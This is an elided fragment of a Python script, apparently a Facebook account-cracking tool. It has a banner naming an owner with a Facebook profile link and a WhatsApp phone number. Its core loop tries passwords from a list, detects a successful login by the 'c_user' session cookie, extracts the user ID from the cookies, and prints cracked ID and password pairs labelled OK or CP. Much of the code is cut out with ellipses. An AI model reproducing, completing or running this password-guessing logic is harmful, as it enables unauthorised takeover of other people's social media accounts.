...
os.system('xdg-open http://wa.me/+4915217509130')
...
\33[1;37m----------------------------------------------
→   Owner              :SAHENO HKR MAFIA KING 💪
→   Facebook            :  https://www.facebook.com/profile.php?id=100072565929405
→   Github            : SAHENO king HKR
    Tools             :free
\x1b[1;97m→       Version    :    3.1
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+ 4915217509130 ?text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SAHENO😜]-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SAHENO HKR😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
